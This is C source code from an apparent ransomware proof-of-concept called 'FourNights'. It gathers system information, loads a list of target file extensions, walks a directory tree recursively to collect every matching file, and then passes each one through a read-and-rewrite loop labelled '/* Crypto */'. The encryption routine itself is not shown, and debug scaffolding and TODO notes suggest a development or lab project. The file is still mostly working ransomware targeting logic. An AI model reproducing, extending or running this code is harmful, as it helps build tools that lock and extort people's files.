#include "fournights.h"

/**
  * debug_list - prints elements of the target_file_buf struct
  * @target_file_buf: lala
  */
#ifndef DEBUG
#define DEBUG
void debug_list(target_file_t *target_file_buf)
{
	printf("--------%s--------\n", target_file_buf->filepath);
	printf("bytes_read: %d\n", (int)target_file_buf->bytes_read);
	printf("file_offset: %d\n", (int)target_file_buf->file_offset);
	printf("st_size: %d\n", (int)target_file_buf->file_info.st_size);
	target_file_buf->buf[400] = '\0';
	printf("%s...(truncated)...", target_file_buf->buf);
	getchar();
}
/**
  * print_for_debug - prints elements of the struct for debugging
  * @ransom: pointer to the ransom struct
  */
void print_for_debug(struct ransom_s ransom)
{
	int debug_int = 0;
	char **debug_dp = NULL;

	/* PRINT STRUCT FOR DEBUGGING */
	printf("DEBUG 0: root_path: %s\n", ransom.root_path);
	printf("DEBUG 1: os_info.sysname: %s, .nodename: %s, .release: %s, .version: %s, .machine: %s\n", ransom.os_info.sysname, ransom.os_info.nodename, ransom.os_info.release, ransom.os_info.version, ransom.os_info.machine);

	printf("DEBUG 2: file extension list \n");
	debug_dp = ransom.file_extensions;
	for (debug_int = 0; debug_dp[debug_int] != NULL; debug_int++)
		printf("%s%s", debug_int == 0 ? "" : ", ", debug_dp[debug_int]);
	getchar();
	printf("\nHas NULL at end? %s\n", debug_dp[debug_int]);
	printf("Filebuffer: Still alive? (strtok truncates past first file ext) %s\n", ransom.file_ext_nontoken);
	getchar();
	printf("Number of extensions to search: %d\n", ransom.num_of_file_ext);
	printf("DEBUG 3: \n");
	print_list(ransom.target_files);
}
#endif

/**
  * free_ransom_struct - Frees all malloced space in the struct
  * @ransom: struct to free
 **/
void free_ransom_struct(ransom_t *ransom)
{
	ransom->root_path = NULL;
	free(ransom->file_ext_nontoken);
	ransom->file_ext_nontoken = NULL;
	free(ransom->file_extensions);
	ransom->file_extensions = NULL;
	free_list(&ransom->target_files);
	ransom->target_files = NULL;
	ransom = NULL;
}
/**
  * sighandler - traps signals
  * @sig: Signal to trap
 **/
static void sighandler(int sig)
{
	if (sig == SIGINT)
	{
		write(1, "\nWTF?!\n", 7);
		exit(1);
	}
}

/**
  * recurse_ls - Searches through a target directory for all files,
 (* and builds a linked list of those files
  * @rootpath: target directory
  * @head: head of the linked list
  * @list_extensions: ptr to a linked list of file extensions
  * Return: Returns a pointer to the head of the linked list
 **/
node_t *recurse_ls(char *dirname, ransom_t *ransom)
{
	size_t len_rootpath, len_filename, calloc_size;
	char *filepath;
	DIR *dir;
	struct dirent *read;
	struct stat file_info;

	dir = opendir(dirname);
	if (!dir)
		return (NULL);
	len_rootpath = my_strlen(dirname);
	len_filename = 0;
	calloc_size = len_rootpath + BUFSIZE;
	filepath = my_calloc(calloc_size, sizeof(char));
	my_strncat(filepath, dirname, 0, len_rootpath);
	while ((read = readdir(dir)))
	{
		if (my_strncmp(read->d_name, ".", 1) == 0 ||
			my_strncmp(read->d_name, "..", 2) == 0)
			continue;
		len_filename = my_strlen(read->d_name);
		if ((len_filename + len_rootpath + 1) > calloc_size)
		{
			recalloc(filepath, calloc_size, calloc_size + BUFSIZE);
			calloc_size += BUFSIZE;
		}
		my_strncat(filepath, read->d_name, len_rootpath, len_filename);
		lstat(filepath, &file_info);
		if (S_ISDIR(file_info.st_mode) != 0)
		{
			my_strncat(filepath, "/", len_rootpath + len_filename, 1);
			recurse_ls(filepath, ransom);
		}
		else if (binary_search_string(read->d_name, len_filename, ransom) != 0)
			add_node(filepath, &ransom->target_files);
	}
	free(filepath);
	closedir(dir);
	return (ransom->target_files);
}

/**
  * main - Entry point
  * @ac: argument count
  * @av: argument vectors
  * Return: 0
  * TODO: putting the list of files into a linked list is a massive race condition bug.
  *       It is acceptable here for development
  * TODO: need to eliminate hard coded strings.
 **/
int main(int ac, char *av[])
{
	ssize_t bytes_read;
	char *default_dir = "/home/vagrant/FourNights/TESTS/";
	char *file_exts = "/home/vagrant/FourNights/c_poc/file_exts.txt";
	node_t *walk;
	struct ransom_s ransom;
	struct utsname sys_info;
	target_file_t *target_file;

	ransom.root_path = NULL;
	ransom.file_ext_nontoken = NULL;
	ransom.file_extensions = NULL;
	ransom.num_of_file_ext = 0;
	ransom.os_info = sys_info;
	ransom.target_files = NULL;

	target_file = malloc(sizeof(target_file_t));
	ransom.target_file_buf = target_file;

/* build target_file_s part of ransom struct */
	ransom.target_file_buf->filepath = my_calloc(BIGBUF, sizeof(char));
	ransom.target_file_buf->buf = my_calloc(BIGBUF * sizeof(char), sizeof(char));
	ransom.target_file_buf->file_offset = 0;
	ransom.target_file_buf->bytes_read = 0;

	/* handle signals */
	signal(SIGINT, sighandler);
	/* Start building struct */
	ransom.root_path = ac == 2 ? av[1] : default_dir;
	if (uname(&sys_info) == -1)
		perror("uname error:");
	ransom.os_info = sys_info;
	if((bytes_read = read_file(file_exts, &ransom, tokenizer)) < 1)
		fprintf(stderr, "File was empty\n");
	recurse_ls(ransom.root_path, &ransom);
	/* Struct Built. */

	/* Crypto */
	ransom.target_file_buf->file_offset = 0;
	ransom.target_file_buf->bytes_read = 0;
	walk = ransom.target_files;
	while(walk)
	{
		my_strncat(ransom.target_file_buf->filepath, walk->str, 0, my_strlen(walk->str));
		do
		{
			bytes_read = ransom.target_file_buf->bytes_read = read_file(walk->str, &ransom, write_file);
#ifndef DEBUG_H
			debug_list(ransom.target_file_buf);
#endif
		}
		while(ransom.target_file_buf->file_offset < ransom.target_file_buf->file_info.st_size);

		/* reset bytes read and file_offset */
		ransom.target_file_buf->file_offset = 0;
		ransom.target_file_buf->bytes_read = 0;
		walk = walk->next;
	}
#ifndef DEBUG_H
	print_for_debug(ransom);
	print_list(ransom.target_files);
#endif
	free_ransom_struct(&ransom);
	free(target_file->buf);
	free(target_file->filepath);
	free(target_file);
	return (EXIT_SUCCESS);
}
